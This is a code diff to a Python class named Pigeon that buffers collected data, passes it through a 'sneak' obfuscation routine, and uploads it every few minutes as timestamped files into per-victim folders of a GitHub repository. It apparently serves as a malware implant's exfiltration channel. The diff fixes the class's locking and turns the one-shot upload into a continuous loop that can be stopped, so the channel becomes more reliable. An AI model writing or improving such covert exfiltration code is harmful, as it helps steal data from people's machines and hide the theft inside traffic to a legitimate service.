@@ -1,7 +1,7 @@
 from config import PARAM, METHODS
 from github import Github, Repository
 from key import GIT_API_KEY
-from threading import Lock
+from threading import Lock, Event
 from time import sleep, strftime
 
 
@@ -11,22 +11,29 @@ class Pigeon:
     __interval: int = 300
     __repo: Repository.Repository 
     __uid: str = ""
+    __service = Event()
 
     @staticmethod
     def pushToBuffer(src: str, con: str) -> None:
         while True:
-            if Pigeon.__bufferLock.acquire_lock():
+            if Pigeon.__bufferLock.acquire(blocking=False):
                 if Pigeon.__buffer.get(src) == None:
                     Pigeon.__buffer[src] = con
                 else:
                     Pigeon.__buffer[src] += con
                 break
-        Pigeon.__bufferLock.release_lock()
+        Pigeon.__bufferLock.release()
 
     @staticmethod
     def startService() -> None:
-        sleep(Pigeon.__interval)
-        Pigeon.__deliverContents()
+        Pigeon.__service.set()
+        while Pigeon.__service.is_set():
+            sleep(Pigeon.__interval)
+            Pigeon.__deliverContents()
+
+    @staticmethod
+    def stopService() -> None:
+        Pigeon.__service.clear()
 
     @staticmethod
     def initComs(uid: str, info: str) -> None:
@@ -41,8 +48,8 @@ class Pigeon:
     @staticmethod
     def __deliverContents() -> None:
         while True:
-            info = METHODS["sneak"](str(Pigeon.__buffer))
-            if Pigeon.__bufferLock.acquire_lock():
+            if Pigeon.__bufferLock.acquire(blocking=False):
+                info = METHODS["sneak"](str(Pigeon.__buffer))
                 message: str = strftime("%Y-%m-%d %H:%M")
                 _, _ = Pigeon.__repo.create_file(
                     "{}/{}".format(Pigeon.__uid, message),
@@ -50,5 +57,5 @@ class Pigeon:
                     info,
                 )
                 Pigeon.__buffer = {}
-                Pigeon.__bufferLock.release_lock()
+                Pigeon.__bufferLock.release()
                 break
